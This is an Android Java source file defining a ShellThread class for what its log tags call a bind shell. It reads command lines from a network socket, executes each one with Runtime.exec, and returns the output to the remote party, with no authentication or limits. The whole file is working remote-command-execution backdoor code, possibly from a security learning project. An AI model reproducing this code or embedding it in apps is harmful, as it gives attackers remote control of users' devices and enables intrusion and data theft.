package me.mclellan.shells;

import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;

public class ShellThread extends Thread {
    private BufferedReader in;
    private PrintWriter out;


    public ShellThread(Socket socket) {
        super("ShellThread");
        try {
            this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            this.out = new PrintWriter(new BufferedWriter(
                    new OutputStreamWriter(socket.getOutputStream())), true
            );
        } catch (IOException e) {
            Log.e("BINDSHELL", e.getMessage());
            e.printStackTrace();
        }
    }

    // https://www.learn2crack.com/2014/03/android-executing-shell-commands.html
    private String execute(String command) {
        StringBuffer output = new StringBuffer();
        Process process;
        try {
            process = Runtime.getRuntime().exec(command);
            process.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    process.getInputStream())
            );
            String line = "";
            while ((line = reader.readLine())!= null) {
                output.append(line + "\n");
            }
        } catch (Exception e) {
            Log.e("BINDSHELL", e.toString());
            return e.toString();
        }
        return output.toString();
    }

    @Override
    public void run() {
        while (true) {
            String str;
            try {
                str = in.readLine();
                if(str != null){
                    Log.i("BINDSHELL","received response from server: " + str);
                    String output = execute(str);
                    out.println(output);
                }
            } catch (IOException e) {
                Log.e("BINDSHELL", e.getMessage());
                e.printStackTrace();
            }
        }
    }
}
